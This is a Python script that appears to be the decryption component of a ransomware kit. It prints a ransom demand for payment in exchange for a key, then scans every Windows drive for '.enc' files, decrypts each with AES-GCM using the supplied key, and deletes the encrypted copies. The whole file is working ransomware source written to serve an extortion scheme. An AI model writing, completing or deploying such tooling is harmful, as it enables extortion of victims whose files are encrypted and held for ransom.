import os, string 
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def main():
    # Prompt user for decryption key
    print("Please send me 100,00$ and I will send you the key: ")
    key = input("Key: ").encode()  # Convert string to bytes
    
    # Initialize AES cipher
    try:
        block = algorithms.AES(key)
    except ValueError as e:
        print("error while setting up aes:", str(e))
        return
    backend = default_backend()

    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            for file_name in files:
                if not file_name.endswith(".enc"):  # Only process .enc files
                    continue
                path = os.path.join(root, file_name)
                
                print(f"Decrypting {path}...")
                
                try:
                    # Read encrypted file
                    with open(path, 'rb') as f:
                        data = f.read()
                    
                    # Extract nonce (12 bytes, standard for GCM) and ciphertext
                    nonce = data[:12]           # 12 bytes đầu
                    tag = data[-16:]           # 16 bytes cuối
                    ciphertext = data[12:-16]  # phần giữa
                    
                    # Initialize GCM mode and cipher
                    gcm = modes.GCM(nonce, tag)
                    cipher = Cipher(block, gcm, backend=backend)
                    decryptor = cipher.decryptor()
                    
                    # Decrypt data
                    original = decryptor.update(ciphertext) + decryptor.finalize()
                    
                    # Write decrypted data to file (remove .enc extension)
                    output_path = path[:-4]  # Remove .enc
                    with open(output_path, 'wb') as f:
                        f.write(original)
                    
                    # Remove encrypted file
                    os.remove(path)
                
                except Exception as e:
                    if "read" in str(e).lower():
                        print("error while reading file contents")
                    elif "write" in str(e).lower():
                        print("error while writing contents")
                    else:
                        print(f"Error: {e}")

if __name__ == "__main__":
    main()
